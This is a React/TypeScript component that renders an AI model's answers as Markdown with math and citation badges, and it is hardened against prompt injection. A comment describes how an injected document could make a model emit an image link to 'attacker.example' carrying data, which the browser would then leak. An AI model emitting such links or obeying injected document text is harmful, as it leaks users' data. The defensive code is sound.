import ReactMarkdown, { type Components } from "react-markdown";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import type { Source } from "../api";

/**
 * Render an assistant answer: Markdown (bold, lists, tables, code), LaTeX math
 * ($...$ inline, $$...$$ display) and "[1]"-style citations as badges.
 *
 * Security: answers are generated from uploaded documents, which can contain
 * injected instructions or markup. react-markdown does NOT render raw HTML by
 * default (we don't add rehype-raw), and its URL filter drops `javascript:`
 * links, so a malicious document can't make the answer run script. Images are
 * shown as links, never loaded (see `img` below).
 */
export default function Answer({ text, sources }: { text: string; sources?: Source[] }) {
  const components: Components = {
    // Never auto-load images from an answer: a prompt-injected document could make
    // the model emit ![](https://attacker.example/?data=...), and the browser fetching
    // it would leak data. Show a plain link instead; the user decides whether to open it.
    img({ src, alt }) {
      return typeof src === "string" && src ? (
        <a href={src} target="_blank" rel="noopener noreferrer">
          [image: {alt || src}]
        </a>
      ) : null;
    },
    a({ href, children }) {
      const cite = href?.match(/^#cite-(\d+)$/);
      if (cite) {
        const src = sources?.find((s) => s.n === Number(cite[1]));
        const title = src ? `${src.filename}${src.page ? `, p.${src.page}` : ""}` : undefined;
        return (
          <sup className="cite" title={title}>
            {cite[1]}
          </sup>
        );
      }
      return (
        <a href={href} target="_blank" rel="noopener noreferrer">
          {children}
        </a>
      );
    },
  };

  return (
    <div className="markdown">
      <ReactMarkdown remarkPlugins={[remarkGfm, remarkMath]} rehypePlugins={[rehypeKatex]} components={components}>
        {prepare(text)}
      </ReactMarkdown>
    </div>
  );
}

/** Normalize what LLMs actually emit before Markdown parsing. */
export function prepare(text: string): string {
  // Split out code and math so citation/delimiter rewriting never touches them.
  const protectedRe = /(```[\s\S]*?(?:```|$)|`[^`\n]*`|\$\$[\s\S]*?\$\$|\$[^$\n]+\$)/g;
  return text
    // LaTeX-style delimiters -> the $ forms remark-math understands.
    .replace(/\\\[([\s\S]*?)\\\]/g, (_, m) => `$$${m}$$`)
    .replace(/\\\(([\s\S]*?)\\\)/g, (_, m) => `$${m}$`)
    .split(protectedRe)
    .map((part, i) =>
      i % 2 === 1
        ? // Code or math: leave alone, except one-line $$...$$, which remark-math
          // treats as INLINE math; LLMs mean a display formula, which needs $$ on its own lines.
          part.startsWith("$$")
          ? `\n$$\n${part.slice(2, -2).trim()}\n$$\n`
          : part
        : //"[1]" or "[1, 4, 7]" (not already a link) -> one link per number, rendered as badges
          part.replace(/\[(\d+(?:\s*,\s*\d+)*)\](?!\()/g, (_, nums: string) =>
            nums
              .split(",")
              .map((n) => `[${n.trim()}](#cite-${n.trim()})`)
              .join(""),
          ),
    )
    .join("");
}
